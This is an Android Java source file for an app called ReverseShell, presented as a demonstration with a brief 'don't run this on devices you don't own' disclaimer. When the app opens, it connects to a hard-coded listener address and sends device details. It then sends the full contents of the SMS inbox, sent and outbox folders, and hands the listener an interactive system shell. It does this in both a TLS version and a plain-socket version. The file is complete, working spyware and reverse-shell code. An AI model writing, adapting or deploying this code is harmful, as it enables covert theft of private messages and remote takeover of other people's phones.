/*
 * Simple Application that demonstrates a non-privileged shell from an Android device,
 * to a secure server somewhere on the network.
 * 
 * Disclaimer: Don't run this on devices you don't own! 
 * */
package solidus.android.droidreverseshell;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.security.GeneralSecurityException;
import java.security.KeyStore;
import java.util.Arrays;
import java.util.Date;

import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManagerFactory;

import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.text.method.ScrollingMovementMethod;
import android.view.Menu;
import android.widget.ProgressBar;
import android.widget.TextView;

public class ReverseShell extends Activity {

	// Some local stuff
	// Includes the parameters of listening process
	private TextView outputText;
	private ProgressBar activitySpinner;
	private final String host = "192.168.2.3";  // Host of Listener
	private final String port = "7777";         // Port of Listener
	private final String shellPath = "/system/bin/sh";
	private Context context;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_reverse_shell);
		context = getApplicationContext();

		try {
			// Get the button and output views
			outputText = (TextView) findViewById(R.id.textView1);
			outputText.setMovementMethod(new ScrollingMovementMethod());
			activitySpinner = (ProgressBar) findViewById(R.id.progressBar1);
			activitySpinner.bringToFront();

			// UI cannot do networking stuff on its own, it needs
			// a separate thread. 
			new SecureConnectionThread().execute(host, port);

		} catch(Exception e) {
			System.exit(1);
		} 
	} // End onCreate

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.reverse_shell, menu);
		return true;
	}

	// ---------------------------------------------- //
	// Subclass: Secure Connection. Separate Thread   //
	// ---------------------------------------------- //
	private class SecureConnectionThread extends AsyncTask<String, Void, String> {

		private InputStream netI;
		private OutputStream netO;
		private SSLSocket sockfd;
		private SSLContext sslContext;
		final String deviceHost = android.os.Build.HOST;
		
		// Dump the contents of the {inbox,outbox,sent} to the
		// connection.
		public String readSMSBox(String box) {
			Uri SMSURI = Uri.parse("content://sms/"+box);
			Cursor cur = getContentResolver().query(SMSURI, null, null, null,null);
			String sms = ""; 
			if(cur.moveToFirst()) {
				for(int i=0; i < cur.getCount(); ++i) {
					// Get information in a readable format
					String number = cur.getString(cur.getColumnIndexOrThrow("address")).toString();
					String date = cur.getString(cur.getColumnIndexOrThrow("date")).toString();
					Long epoch = Long.parseLong(date);
					Date fDate = new Date(epoch * 1000);
					date = fDate.toString();
					String body = cur.getString(cur.getColumnIndexOrThrow("body")).toString();
					sms += "["+number+":"+date+"]"+body+"\n";
					cur.moveToNext();
				}
				sms += "\n";
			}
			return sms;
		}

		public String deviceInfo() {
			String ret = "--------------------------------------------\n";
			ret += "Manufacturer: "+android.os.Build.MANUFACTURER+"\n";
			ret += "Version/Release: "+android.os.Build.VERSION.RELEASE+"\n";
			ret += "Product: "+android.os.Build.PRODUCT+"\n";
			ret += "Model: "+android.os.Build.MODEL+"\n";
			ret += "Brand: "+android.os.Build.BRAND+"\n";
			ret += "Device: "+android.os.Build.DEVICE+"\n";
			ret += "Host: "+android.os.Build.HOST+"\n";
			ret += "--------------------------------------------\n";
			return ret;
		}

		// Runs a process, handling the process's input and
		// output by sending/receiving IO from the socket
		public void runShell() throws Exception {

			ProcessBuilder	pb = new ProcessBuilder(shellPath);
			pb.redirectErrorStream(true);
			Process shell = pb.start();

			if(shell == null) {
				sockfd.close();
				return;
			}

			ProcessIOThread p1 = new ProcessIOThread(shell.getInputStream(), netO);
			ProcessIOThread p2 = new ProcessIOThread(netI, shell.getOutputStream());
			p1.start();
			p2.start();

			while(!p1.running || !p2.running)
				Thread.sleep(100);
			while(p1.running || p2.running) {
				Thread.sleep(100);
				Thread.yield();
			}
		} // End runShell
		
		// Build SSLContext and return the secure socket
		protected SSLSocket getSecureSocket(String ip, int port) throws Exception {
			
			try {
				// Load trust
				KeyStore trustStore = KeyStore.getInstance("BKS");
				InputStream storeStream = context.getResources().openRawResource(R.raw.android);
				
				// Hard-coded password. Not proud of it, but it only
				// exists in memory for a split second.
				char[] password = "thepasswordgoes".toCharArray();
				trustStore.load(storeStream, password);
				Arrays.fill(password, '0');
				
				TrustManagerFactory tmf = TrustManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
				tmf.init(trustStore);
				storeStream.close();
				
				// Create SSL Context
				sslContext = SSLContext.getInstance("TLS");
				sslContext.init(null, tmf.getTrustManagers(), null);
				SSLSocketFactory sslsf = sslContext.getSocketFactory();
				SSLSocket retSocket = (SSLSocket) sslsf.createSocket(ip, port);
				String[] supported = retSocket.getSupportedCipherSuites();
				retSocket.setEnabledCipherSuites(supported);
				return retSocket;
				
			} catch(GeneralSecurityException e) {
				throw new IOException("Technically speaking, shit broke.");
			}
		} // End getSecureSocket
		
		@Override
		protected String doInBackground(String... params) {
			String ret = "Error.";
			try {
				sockfd = getSecureSocket(params[0], Integer.parseInt(params[1]));

				// PING with the name of the deviceHost
				DataOutputStream dOut = new DataOutputStream(sockfd.getOutputStream());
				dOut.writeBytes(deviceHost+"\r\n");
				
				// Enable Cipher Suites
				String[] supported = sockfd.getSupportedCipherSuites();
				sockfd.setEnabledCipherSuites(supported);

				netI = sockfd.getInputStream();
				netO = sockfd.getOutputStream();

				// Recon
				dOut.writeBytes(deviceInfo());
				dOut.flush();

				// Pilfering
				dOut.writeBytes("[>] SMS Inbox:\r\n"+readSMSBox("inbox"));
				dOut.writeBytes("[>] SMS Sent:\r\n"+readSMSBox("sent"));
				dOut.writeBytes("[>] SMS Outbox:\r\n"+readSMSBox("outbox"));
				dOut.writeBytes("[>] Sending shell:\r\n");
				dOut.flush();

				// More Fun
				runShell();

				sockfd.close();
			} catch(Exception e) {
				return e.toString();
			}
			return ret;
		}

		@Override
		protected void onPostExecute(String result) {
			outputText.setText(result);
		}
	} // End SecureConnectionThread

	// --------------------------------------------------- //
	// Subclass: Connection. Non-secure, Separate Thread   //
	// --------------------------------------------------- //
	private class ConnectionThread extends AsyncTask<String, Void, String> {

		InputStream netI;
		OutputStream netO;
		Socket sockfd;

		// Dump the contents of the {inbox,outbox,sent} to the
		// connection.
		public String readSMSBox(String box) {
			Uri SMSURI = Uri.parse("content://sms/"+box);
			Cursor cur = getContentResolver().query(SMSURI, null, null, null,null);
			String sms = "";
			if(cur.moveToFirst()) {
				for(int i=0; i < cur.getCount(); ++i) {
					// Get information in a readable format
					String number = cur.getString(cur.getColumnIndexOrThrow("address")).toString();
					String date = cur.getString(cur.getColumnIndexOrThrow("date")).toString();
					Long epoch = Long.parseLong(date);
					Date fDate = new Date(epoch * 1000);
					date = fDate.toString();
					String body = cur.getString(cur.getColumnIndexOrThrow("body")).toString();
					sms += "["+number+":"+date+"]"+body+"\n";
					cur.moveToNext();
				}
				sms += "\n";
			}
			return sms;
		}

		// Return a String of basic information about the device
		public String deviceInfo() {
			String ret = "--------------------------------------------\n";
			ret += "Manufacturer: "+android.os.Build.MANUFACTURER+"\n";
			ret += "Version/Release: "+android.os.Build.VERSION.RELEASE+"\n";
			ret += "Product: "+android.os.Build.PRODUCT+"\n";
			ret += "Model: "+android.os.Build.MODEL+"\n";
			ret += "Brand: "+android.os.Build.BRAND+"\n";
			ret += "Device: "+android.os.Build.DEVICE+"\n";
			ret += "Host: "+android.os.Build.HOST+"\n";
			ret += "+--------------------------------------------\n";
			return ret;
		}

		// Runs a process, handling the process's input and
		// output by sending/receiving IO from the socket
		public void runShell() throws Exception {

			// Build the process
			ProcessBuilder	pb = new ProcessBuilder(shellPath);
			pb.redirectErrorStream(true);
			Process shell = pb.start();

			if(shell == null) {
				sockfd.close();
				return;
			}

			// Get Process IO
			ProcessIOThread p1 = new ProcessIOThread(shell.getInputStream(), netO);
			ProcessIOThread p2 = new ProcessIOThread(netI, shell.getOutputStream());
			p1.start();
			p2.start();

			while(!p1.running || !p2.running)
				Thread.sleep(100);
			while(p1.running || p2.running) {
				Thread.sleep(100);
				Thread.yield();
			}
		}

		@Override
		protected String doInBackground(String... strings) {
			String ret = "Error.";
			try {
				sockfd = new Socket(strings[0], Integer.parseInt(strings[1]));
				netI = sockfd.getInputStream();
				netO = sockfd.getOutputStream();
				DataOutputStream dOut = new DataOutputStream(netO);

				// Recon
				dOut.writeBytes(deviceInfo());

				// Pilfering
				dOut.writeBytes("[>] SMS Inbox:\r\n"+readSMSBox("inbox"));
				dOut.writeBytes("[>] SMS Sent:\r\n"+readSMSBox("sent"));
				dOut.writeBytes("[>] Receiving shell, type your commands:\r\n");
				dOut.flush();

				// ++
				runShell();

				sockfd.close();
			} catch(Exception e) {
				return e.toString();
			}
			return ret;
		}

		@Override
		protected void onPostExecute(String result) {
			outputText.setText(result);
		}
	} // End ConnectionThread (unsecured)

	// ---------------------------------------------- //
	// Subclass: Used to duplex socket IO/Process IO  //
	// ---------------------------------------------- //
	private class ProcessIOThread extends Thread {

		InputStream input;
		OutputStream output;
		boolean running;

		public ProcessIOThread(InputStream i, OutputStream o) {
			running = false;
			input = i;
			output = o;
		}

		@Override 
		public void run() {
			running = true;
			try {
				byte buff[] = new byte[8192];
				int count = input.read(buff);
				while(count > 0) {
					output.write(buff, 0, count);
					output.flush();
					count = input.read(buff);
				}

			} catch(Exception e) {
				outputText.setText(e.toString());
			}

			running = false;
		}
	}
}